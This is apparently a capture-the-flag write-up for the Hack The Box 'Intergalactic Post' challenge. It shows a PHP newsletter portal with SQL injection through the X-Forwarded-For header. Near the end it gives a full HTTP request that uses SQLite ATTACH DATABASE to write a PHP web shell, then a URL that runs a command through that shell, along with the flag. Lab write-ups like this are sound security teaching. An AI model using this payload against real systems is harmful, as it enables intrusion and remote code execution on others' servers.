# Intergalactic Post

```
The biggest intergalactic newsletter agency has constantly been spreading misinformation about the energy crisis war. Bonnie's sources confirmed a hostile takeover of the agency took place a few months back, and we suspect the Golden Fang army is behind this. Ulysses found us a potential access point to their agency servers. Can you hack their newsletter subscribe portal and get us entry?
```

examinging the source of the challenge we find unsafe string interpolation leading to SQL injection

```php

# Database.php
...
    public function subscribeUser($ip_address, $email)
    {
        return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
    }
...
```

but $email is filtered

```php
# SubsController.php
...
        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            header('Location: /?success=false&msg=Please submit a valild email address!');
            exit;
        }
...
```

so let's injected via $ip_adress. We can control the value with HTTP Headers

```php
...
# SubscriberModel.php
    public function getSubscriberIP(){
        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER["REMOTE_ADDR"];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        return '';
    }
...
```

we know the db is sqlite, so let's research on some payloads.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database

Thos has good potential, because we have a php webserver

```
POST /subscribe HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://localhost:1337
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
X-Forwarded-For: 127.0.0.1',+'test');ATTACH DATABASE '/www/t.php' AS t;CREATE TABLE t.pwn (dataz text);INSERT INTO t.pwn (dataz) VALUES('<?php system($_GET["cmd"]); ?>')--
Sec-Fetch-User: ?1

email=test%40test.com
```

now navigate to our created webshell for RCE!

http://157.245.33.77:30496/t.php?cmd=cat%20/flag*

HTB{inj3ct3d_th3_tru7h}